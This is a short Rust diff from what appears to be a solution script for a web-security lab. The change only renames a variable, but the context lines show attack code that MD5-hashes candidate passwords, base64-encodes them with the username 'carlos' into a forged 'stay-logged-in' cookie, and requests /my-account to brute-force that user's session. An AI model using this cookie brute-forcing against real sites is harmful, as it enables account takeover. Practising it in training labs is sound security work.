@@ -57,13 +57,13 @@ async fn main() -> Result<(), Box<dyn error::Error>> {
         let password_hash = format!("{:x}", md5::compute(password)); 
         
         // encrypt the hash with the username (base64)
-        let cookie_encrypted = base64::engine::general_purpose::STANDARD_NO_PAD
+        let cookie_encoded = base64::engine::general_purpose::STANDARD_NO_PAD
             .encode(format!("carlos:{password_hash}")); 
         
         // try to GET /my-account with the modified cookie
         let get_res = client
             .get(format!("{url}/my-account"))
-            .header("Cookie", format!("stay-logged-in={cookie_encrypted}"))
+            .header("Cookie", format!("stay-logged-in={cookie_encoded}"))
             .send()
             .await?; 
 
